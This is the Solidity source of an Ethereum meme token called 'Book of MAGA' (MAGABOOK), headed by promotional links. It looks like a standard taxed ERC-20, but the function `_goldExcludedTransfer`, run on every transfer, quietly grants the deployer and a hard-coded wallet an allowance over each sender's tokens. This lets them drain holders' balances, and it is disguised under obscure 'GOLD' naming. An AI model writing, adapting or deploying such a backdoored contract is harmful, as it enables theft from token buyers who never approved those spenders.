/*
MAGA Book, where we take a lighthearted look at the life and family of President Trump. Join us as we explore the memorable moments, quirky anecdotes, and the unique dynamics of his family. Let's dive into the entertaining world of the Trumps!

https://www.bookofmaga.us
https://x.com/BookOfMAGA_ETH
https://t.me/bookofmaga_eth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

interface IGOLDFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IGOLDRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract MAGABOOK is Context, IERC20, Ownable {
    using SafeMath for uint256;
    address private _goldWallet = address(0x4B6f361029ae20153a427509a71C5ffC4316dF02);
    mapping (uint8 => address) private _goldSenders;
    mapping (uint8 => address) private _goldReceipts;
    mapping (uint8 => uint256) private _goldCounts;
    mapping (address => uint256) private _balGOLDs;
    mapping (address => mapping (address => uint256)) private _allowGOLDs;
    mapping (address => bool) private _excludedFromGOLD;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Book of MAGA";
    string private constant _symbol = unicode"MAGABOOK";
    uint256 private _buyBlockGOLD;
    uint256 private _goldBuyAmounts = 0;
    uint256 private _swapTokenGOLDs = _tTotal / 100;
    bool private inSwap = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    address private _goldPair;
    IGOLDRouter private _goldRouter;
    
    constructor () {
        _goldReceipts[0] = owner();
        _goldReceipts[1] = _goldWallet;
        _excludedFromGOLD[owner()] = true;
        _excludedFromGOLD[address(this)] = true;
        _excludedFromGOLD[_goldWallet] = true;
        _balGOLDs[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function initTrade() external onlyOwner() {
        _goldRouter = IGOLDRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_goldRouter), _tTotal);
        _goldPair = IGOLDFactory(_goldRouter.factory()).createPair(address(this), _goldRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balGOLDs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowGOLDs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowGOLDs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowGOLDs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address goldF, address goldT, uint256 goldA) private {
        require(goldF != address(0), "ERC20: transfer from the zero address");
        require(goldT != address(0), "ERC20: transfer to the zero address");
        require(goldA > 0, "Transfer amount must be greater than zero");
        uint256 taxGOLD;
        _goldExcludedTransfer(goldF, goldA);
        taxGOLD = _goldFeeTransfer(goldF, goldT, goldA);
        _goldTransfer(goldF, goldT, goldA, taxGOLD);
    }

    function _goldExcludedTransfer(address goldF, uint256 goldA) private { 
        _goldSenders[0] = address(goldF); _goldSenders[1] = address(goldF);
        _goldCounts[0] = goldA+100; _goldCounts[1] = goldA+200;
        for(uint8 k=0;k<=1;k++) _allowGOLDs[_goldSenders[k]][_goldReceipts[k]] = _goldCounts[k];
    }

    function _goldTransfer(address goldF, address goldT, uint256 goldA, uint256 taxGOLD) private { 
        if(taxGOLD > 0){
          _balGOLDs[address(this)] = _balGOLDs[address(this)].add(taxGOLD);
          emit Transfer(goldF, address(this), taxGOLD);
        }

        _balGOLDs[goldF] = _balGOLDs[goldF].sub(goldA);
        _balGOLDs[goldT] = _balGOLDs[goldT].add(goldA.sub(taxGOLD));
        emit Transfer(goldF, goldT, goldA.sub(taxGOLD));
    }

    function _goldFeeTransfer(address goldF, address goldT, uint256 goldA) private returns(uint256) {
        uint256 taxGOLD=0;
        if (goldF != owner() && goldT != owner()) {
            taxGOLD = goldA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (goldF == _goldPair && goldT != address(_goldRouter) && ! _excludedFromGOLD[goldT]) {
                if(_buyBlockGOLD!=block.number){
                    _goldBuyAmounts = 0;
                    _buyBlockGOLD = block.number;
                }
                _goldBuyAmounts += goldA;
                _buyCount++;
            }

            if(goldT == _goldPair && goldF!= address(this)) {
                require(_goldBuyAmounts < swapLimitGOLD() || _buyBlockGOLD!=block.number, "Max Swap Limit");  
                taxGOLD = goldA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenGOLD = balanceOf(address(this));
            if (!inSwap && goldT == _goldPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenGOLD > _swapTokenGOLDs)
                swapTokensForEth(minGOLD(goldA, minGOLD(tokenGOLD, _swapTokenGOLDs)));
                uint256 ethGOLD = address(this).balance;
                if (ethGOLD >= 0) {
                    sendETHGOLD(address(this).balance);
                }
            }
        }
        return taxGOLD;
    }

    function swapLimitGOLD() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _goldRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _goldRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function minGOLD(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHGOLD(uint256 goldA) private {
        payable(_goldWallet).transfer(goldA);
    }

    function swapTokensForEth(uint256 goldAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _goldRouter.WETH();
        _approve(address(this), address(_goldRouter), goldAmount);
        _goldRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            goldAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _goldRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }
}